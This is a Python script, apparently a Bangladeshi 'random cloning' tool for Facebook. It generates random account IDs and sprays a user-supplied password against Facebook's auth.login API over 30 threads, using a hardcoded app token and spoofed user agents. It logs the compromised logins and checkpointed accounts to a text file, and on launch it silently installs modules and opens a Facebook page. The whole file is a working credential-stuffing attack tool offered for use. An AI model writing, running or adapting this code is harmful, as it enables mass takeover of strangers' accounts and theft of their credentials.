W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")
import urllib
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
os.system("xdg-open https://www.facebook.com/team.copyright.official1")
try:
  os.system("mkdir SAVE")
except:
  pass
okc="ok.txt"
cpc="cp.txt"
logo = ("""\033[1;32m


 

         \033[1;32m╭━━━━┳━━━┳━━━┳━╮╭━╮
         \033[1;32m┃╭╮╭╮┃╭━━┫╭━╮┃┃╰╯┃┃
         \033[1;32m╰╯┃┃╰┫╰━━┫┃╱┃┃╭╮╭╮┃
         \033[1;32m╱╱┃┃╱┃╭━━┫╰━╯┃┃┃┃┃┃
         \033[1;32m╱╱┃┃╱┃╰━━┫╭━╮┃┃┃┃┃┃
         \033[1;32m╱╱╰╯╱╰━━━┻╯╱╰┻╯╰╯╰╯
\033[1;32m╭━━━┳━━━┳━━━┳╮╱╱╭┳━━━┳━━┳━━━┳╮╱╭┳━━━━╮
\033[1;32m┃╭━╮┃╭━╮┃╭━╮┃╰╮╭╯┃╭━╮┣┫┣┫╭━╮┃┃╱┃┃╭╮╭╮┃
\033[1;32m┃┃╱╰┫┃╱┃┃╰━╯┣╮╰╯╭┫╰━╯┃┃┃┃┃╱╰┫╰━╯┣╯┃┃╰╯
\033[1;32m┃┃╱╭┫┃╱┃┃╭━━╯╰╮╭╯┃╭╮╭╯┃┃┃┃╭━┫╭━╮┃╱┃┃
\033[1;32m┃╰━╯┃╰━╯┃┃╱╱╱╱┃┃╱┃┃┃╰┳┫┣┫╰┻━┃┃╱┃┃╱┃┃
\033[1;32m╰━━━┻━━━┻╯╱╱╱╱╰╯╱╰╯╰━┻━━┻━━━┻╯╱╰╯╱╰╯ 
\033                             
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
\033[1;32m┃CEO : TANIM              ┃TOOL : OLD ID  ┃       ┃CEO : MAMUN              ┃VERSION : 4.2  ┃
\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫       ┃GITHUB : Tan-vai      ┃TYPE : FREE RANDOM┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛
________________________________________\033[1;35m""")
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print(" [1] Random Clonning")
		print("\n")
		Finding =input(" Choose : ")
		if Finding in ["1", "01"]:
			self.old()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			Main()
	def old(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \n\033[1;35m[+]\033[1;35m TOTAL IDS TO CRACK LIMIT 9999999999 : "))
		
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			#print(self.id)
			print("\033[0;93m [+] TOTAL ID -> \033[1;36m%s\033[1;39m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print(f"\n%s [+] OK RESULTS SAVED IN -> {okc}"%(Y))
				print(f"%s [+] CP RESULTS SAVED IN -> {cpc}"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] Okay Dear Your Crack is complte...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)"])
		sys.stdout.write("\r [ Finding ] %s/%s -> Cp:-%s - Ok:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok)))
		sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"9.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
}

			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
			#print(response.text)
			#sys.exit()
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ DCA ] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open(okc,"a").write(" %s|%s\n"%(uid, pw))
				break
			elif "mbasic.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ DCA ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open(okc,"a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				#print("\r \033[1;33m[ Finding ] %s | %s\033[0;97m         "%(uid, pw))
				continue

		self.loop +=1
Main()
